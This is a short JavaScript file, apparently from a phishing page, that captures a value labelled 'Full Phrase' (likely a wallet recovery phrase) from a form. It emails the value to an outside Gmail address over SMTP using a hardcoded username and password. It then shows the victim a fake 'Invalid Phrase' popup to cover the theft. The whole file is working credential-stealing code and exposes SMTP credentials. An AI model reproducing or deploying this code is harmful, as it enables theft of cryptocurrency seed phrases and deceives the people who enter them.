const Form = document.querySelector('form');
const Names = document.getElementById('names')

function sendEmail(){
    const bodyMessage = `This is the Full Phrase: ${Names.value}`;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "joechidubem001@gmail.com",
        Password : "ED71DE7A6597B6E3D057AB717D81AC43F8A5",
        To : 'jchidubem49@gmail.com',
        From : "joechidubem001@gmail.com",
        Subject : Names.value,
        Body : bodyMessage
    }).then(
      message => {
        if(message === "OK") {
            Swal.fire({
                title: 'Invalid Phrase',
                showClass: {
                  popup: 'animate__animated animate__fadeInDown'
                },
                hideClass: {
                  popup: 'animate__animated animate__fadeOutUp'
                }
              })
        }
      }
    );
};


Form.addEventListener("submit", (e) =>{
    e.preventDefault();

    sendEmail()

});

